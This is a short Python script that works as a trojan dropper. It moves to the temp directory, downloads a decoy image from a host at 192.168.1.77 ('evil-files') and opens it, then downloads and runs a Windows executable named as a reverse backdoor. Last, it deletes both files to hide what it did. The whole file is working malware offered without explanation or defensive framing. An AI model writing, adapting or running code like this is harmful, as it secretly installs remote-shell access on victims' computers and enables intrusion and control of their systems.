#!/usr/bin/env python

import requests
import subprocess
import os
import tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.1.77/evil-files/meche.jpg")
subprocess.Popen("meche.jpg", shell=True)

download("http://192.168.1.77/evil-files/reverse_backdoor4windows.exe")
subprocess.call("reverse_backdoor4windows.exe", shell=True)

os.remove("meche.jpg")
os.remove("reverse_backdoor4windows.exe")
